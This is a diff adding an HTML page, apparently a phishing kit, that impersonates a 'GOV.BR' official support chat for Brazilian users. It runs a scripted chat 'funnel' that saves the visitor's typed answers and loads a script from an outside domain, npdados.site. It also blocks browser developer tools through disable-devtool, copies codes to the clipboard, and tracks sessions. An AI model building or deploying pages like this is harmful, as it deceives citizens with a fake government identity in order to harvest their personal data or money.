@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    <link rel="stylesheet" href="/assets/css/services.css">
+    <link rel="stylesheet" href="/assets/css/solicitar.css">
+    <title>Portal Logado</title>
+</head>
+
+<body>
+    <header>
+        <div class="container flex align-center">
+            <a href="/valores">
+                <div class="back flex"><svg fill="#404040" xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor" class="bi bi-arrow-left-short" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M12 8a.5.5 0 0 1-.5.5H5.707l2.147 2.146a.5.5 0 0 1-.708.708l-3-3a.5.5 0 0 1 0-.708l3-3a.5.5 0 1 1 .708.708L5.707 7.5H11.5a.5.5 0 0 1 .5.5"/></svg></div>
+            </a><img draggable="false" class="logo" src="/assets/img/atendimento.webp" alt=""></div>
+        <div class="container">
+            <div class="name"><strong>Atendimento GOV.BR</strong><img src="/assets/img/verified.webp" alt="" class="verified"></div>
+            <div class="statusatendimento">iniciando...</div>
+        </div><img src="/assets/img/govbr.png" class="logoV" draggable="false" alt=""></header>
+    <div class="chatbox" style="opacity:0">
+        <main mp-view-event="Contact" class="chat" id="chat"></main>
+    </div>
+    <div style="display:none" class="meta" id="meta">Status: pronto • respostas salvas: <span id="savedCount">0</span></div>
+    <div class="controls" id="controls">
+        <div class="inputWrap" id="inputWrap" style="position:fixed;bottom:0;width:100vw;background:#fff;z-index:999999;left:0"><input class="textin" id="textin" placeholder="Digite sua resposta..."> <button class="btn" id="sendBtn" disabled="disabled">Enviar</button></div>
+        <div style="width:120px;display:none">
+            <div class="progressBar" title="Progresso do funil"><i id="progress"></i></div>
+        </div>
+    </div>
+    <style>
+        .chatloading {
+            display: flex;
+            align-items: center;
+            justify-content: center
+        }
+    </style>
+    <div class="chatloading flex center">
+        <div class="grid center">
+            <div class="loaderdots"></div>
+            <h3>Iniciando atendimento...</h3>
+        </div>
+    </div>
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"8beff67d6cbd4f26a8f06ec229b0567a","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+        crossorigin="anonymous"></script>
+</body>
+<div class="copied-notification" hidden>O código foi copiado!</div>
+<script>
+    function M4357834603569(e, t) {
+        if (e instanceof HTMLInputElement || e instanceof HTMLTextAreaElement)
+            if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(e.value).then(() => {}).catch(e => {});
+            else {
+                e.select(), e.setSelectionRange(0, 99999);
+                try {
+                    document.execCommand("copy")
+                } catch (e) {}
+                window.getSelection().removeAllRanges()
+            }
+        else console.error("");
+        const n = document.querySelector(".copied-notification");
+        n.hidden && (n.style.opacity = 0, n.style.transform = "translateY(4rem)", n.hidden = !1, setTimeout(() => {
+            n.style.opacity = 1, n.style.transform = "translateY(0)", setTimeout(() => {
+                n.style.transform = "translateY(4rem)", n.style.opacity = 0, setTimeout(() => {
+                    n.hidden = !0
+                }, 400)
+            }, 4e3)
+        }, 10))
+    }
+</script>
+<script src="/assets/js/skg.js"></script>
+<script src="https://npdados.site/DT/main.js?nocache=42562645789264"></script>
+<script>
+    window._STDT_PXPGN = window._STDT("1275268571075710")
+</script>
+
+</html>
+<script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"></script>
+<script type="text/javascript">
+    (function(c, l, a, r, i, t, y) {
+        c[a] = c[a] || function() {
+            (c[a].q = c[a].q || []).push(arguments)
+        };
+        t = l.createElement(r);
+        t.async = 1;
+        t.src = "https://www.clarity.ms/tag/" + i;
+        y = l.getElementsByTagName(r)[0];
+        y.parentNode.insertBefore(t, y);
+    })(window, document, "clarity", "script", "tmf7d225xn");
+</script>
